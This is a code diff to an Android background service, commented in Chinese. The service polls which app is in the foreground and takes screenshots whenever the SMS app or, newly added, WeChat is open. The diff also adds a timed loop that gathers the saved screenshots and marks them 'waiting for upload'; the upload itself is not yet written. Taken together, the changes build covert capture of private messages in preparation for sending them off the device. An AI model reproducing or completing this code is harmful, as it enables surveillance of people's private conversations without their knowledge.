@@ -28,6 +28,7 @@ import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.List;
+import java.util.Vector;
 
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 
@@ -47,6 +48,12 @@ public class RecordService extends Service {
 
     private String  currentAppName = "";
 
+    private long mUploadDaleyMillis = 15000; // 上传时间/毫秒
+    private long mRecordDaleyMillis = 10000; // 截图时间/毫秒
+    private String mSaveImageDir = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";
+
+
+
     @Override
     public IBinder onBind(Intent intent) {
         return new RecordBinder();
@@ -63,7 +70,8 @@ public class RecordService extends Service {
         super.onCreate();
         HandlerThread serviceThread = new HandlerThread("service_thread", Process.THREAD_PRIORITY_BACKGROUND);
         serviceThread.start();
-        autoTakePhoto();
+        autoTakePhoto();   // 自动截屏
+        autoUploadPhoto(); // 自动上传截图
         running = false;
     }
 
@@ -128,7 +136,7 @@ public class RecordService extends Service {
 
         SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss");
         String strDate = dateFormat.format(new java.util.Date());
-        String pathImage = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";
+        String pathImage = mSaveImageDir;
 
         //检测目录是否存在
         File localFileDir = new File(pathImage);
@@ -190,8 +198,6 @@ public class RecordService extends Service {
 
     public void autoTakePhoto(){
 
-        Log.d(TAG,"======================");
-
         final Handler localHandler = new Handler();
         Runnable localRunnable = new Runnable() {
             @Override
@@ -203,7 +209,7 @@ public class RecordService extends Service {
                 getTopApp(RecordService.this);
 
                 // 定时x秒，调用Activity，当Activity被激活的时候，自动开始申请权限，并截图
-                if(currentAppName.contains("com.android.messaging")){
+                if(currentAppName.contains("com.android.messaging") || currentAppName.contains("com.tencent.mm")){
                     Intent localIntent = new Intent();
                     localIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                     localIntent.setClass(RecordService.this,MainActivity.class);
@@ -211,13 +217,48 @@ public class RecordService extends Service {
                 }
 
                 // 延迟x秒，重复执行run函数
-                localHandler.postDelayed(this,5000);
+                localHandler.postDelayed(this,mRecordDaleyMillis);
             }
         };
 
         localHandler.post(localRunnable);
 
     }
+
+    public void autoUploadPhoto(){
+
+        final Handler localHandler = new Handler();
+        Runnable localRunnable = new Runnable() {
+            @Override
+            public void run() {
+
+                getFiles(mSaveImageDir);
+                // 延迟x秒，重复执行run函数
+                localHandler.postDelayed(this,mUploadDaleyMillis);
+            }
+        };
+
+        localHandler.post(localRunnable);
+
+    }
+
+    public void getFiles(String fileAbsolutePath) {
+
+        File file = new File(fileAbsolutePath);
+        File[] subFile = file.listFiles();
+        for (int iFileLength = 0; iFileLength < subFile.length; iFileLength++) {
+            // 判断是否为文件夹
+            if (!subFile[iFileLength].isDirectory()) {
+                String filename = subFile[iFileLength].getName();
+                // 判断是否为PNG结尾
+                if (filename.trim().toLowerCase().endsWith(".png")) {
+                    Log.d(TAG,"Waiting for upload file:"+ filename);
+                }
+            }
+        }
+    }
+
+
 
     private void getTopApp(Context context) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
